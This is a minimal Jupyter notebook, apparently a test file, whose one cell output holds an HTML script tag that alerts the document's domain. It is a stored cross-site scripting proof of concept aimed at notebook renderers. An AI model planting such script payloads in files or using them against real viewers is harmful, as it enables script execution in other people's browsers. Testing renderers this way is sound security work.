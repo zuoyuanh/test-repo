{
"cells": [
{
"cell_type": "code",
"execution_count": null,
"metadata": {},
"outputs": [ {
"output_type": "display_data",
"data": {
"text/plain": "<IPython.core.display.HTML object>",
"text/html": "<script>top.alert(document.domain)</script>"
},
"metadata": {}
}
],
"source": []}
],
"metadata": {
"language_info": {
"name": "python"
}
},
"nbformat": 4,
"nbformat_minor": 2
}